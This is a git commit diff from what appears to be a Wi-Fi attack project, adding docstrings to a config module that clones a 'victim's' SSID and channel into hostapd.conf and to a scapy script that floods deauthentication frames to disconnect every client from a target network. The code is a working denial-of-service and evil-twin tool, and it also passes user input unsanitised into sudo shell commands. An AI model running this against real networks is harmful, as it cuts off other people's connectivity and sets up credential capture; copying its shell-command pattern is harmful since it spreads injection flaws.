f89680e087f84e783589f8b25a6fc74f0d44a561
matannagar <73398186+matannagar@users.noreply.github.com>
2022-05-02 09:58:31 +0300

    configs & spoofing documentation

--- configs/config.py
+++ configs/config.py
@@ -1,24 +1,32 @@
 import os
 
+
 def setMonitorMode(wlan):
+    """Gets from the user the full interface name to set to Monitor Mode and sets him.
+    @param wlan: The wlan address"""
     os.system("sudo ip link set " + wlan + " down")
     os.system("sudo iw " + wlan + " set type monitor")
     os.system("sudo ip link set " + wlan + " up")
 
 
-def updateHostAP(known,BSSID):
-    # changing hostapd.conf channel to the victim's wifi channel.
+def updateHostAP(known, BSSID):
+    """updates hostapd.conf channel to the victim's wifi channel (will be used to assign IP subnets to link-layer addresses).
+    @param known: All the networks we have found in known
+    @param BSSID: The target address"""
     filename = "./configs/hostapd.conf"
     text = str("#Set wifi interface" + "\n" + "interface=wlan0" + "\n" + "#Set network name" + "\n" + "ssid=" +
                str(known[BSSID][0]) + "\n" + "#Set channel" + "\n" + "channel=" + str(
-        known[BSSID][1]) + "\n" + "#Set driver" + "\n" + "driver=nl80211")
+                   known[BSSID][1]) + "\n" + "#Set driver" + "\n" + "driver=nl80211")
     f = open(filename, 'w')
     f.close()
     f = open(filename, 'w')
     f.write(text)
     f.close()
 
+
 def setManagerMode(wlan):
+    """Changing the interface back to managed mode.
+    @param wlan: wlan address"""
     os.system("sudo ip link set " + wlan + " down")
     os.system("sudo iw wlan0 set type managed")
     os.system("sudo ip link set " + wlan + " up")
--- spoofing/spoofing.py
+++ spoofing/spoofing.py
@@ -1,21 +1,29 @@
 from scapy.all import sendp
-from scapy.layers.dot11 import Dot11Deauth, RadioTap,Dot11
+from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11
+
 
 def DeAuthLoop(interface, brdMac, BSSID, numOfPack):
+    """Creates Dot11Deauth packets that will disconnect the target address from the network.
+    @param interface: The interface
+    @param brdMac: The broadcast address
+    @param BSSID: The target address
+    @param numOfPack: The num Of Pack we wish to send"""
+    # Addr1 is the broadcast addr
+    # Addr2 is the target addr
+    # Addr3 is used to target specific clients(users) (but I set it to the target addr to kick everyone off the network)
+    # Interface is the full wlan address. (can be found via the terminal... run command 'pwconfig' and find the desired device)
     for i in range(0, numOfPack):
-        # This creates a Dot11Deauth packet that will be used to kick everyone out of the target network
-        # Addr1 is the broadcast addr
-        # Addr2 is the target addr
-        # Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network
         pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
         sendp(pkt, iface=interface, count=100000000,
-              inter=.001)  # Send deauth packet
+              inter=.001)  # Send the packets
 
 
-def setTarget(brdMac,interface,BSSID):
-    
-    numOfPack = int(input("how many packets do u wish to send? "))
-    # infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
+def setTarget(brdMac, interface, BSSID):
+    """Gets from the user how many packets to send, and makes the attack with the DeAuthLoop function.
+    @param brdMac: The broadcast address
+    @param interface: The interface
+    @param BSSID: The target address"""
+    numOfPack = int(input("How many packets to send?"))
     DeAuthLoop(interface, brdMac, BSSID, numOfPack)
 
-    return brdMac
+    return
